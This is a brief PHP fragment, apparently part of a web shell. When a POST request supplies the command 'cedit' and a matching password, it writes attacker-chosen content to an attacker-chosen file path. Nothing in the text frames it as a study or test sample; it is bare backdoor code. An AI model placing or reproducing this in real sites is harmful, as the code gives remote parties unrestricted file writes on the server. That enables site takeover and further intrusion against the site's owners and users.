<?php
if ($_POST["cmd"] == 'cedit' && $_POST["pass"] == $pass && $useduid == false) {
	file_put_contents($_POST['write'], $_POST['params']);
}
?>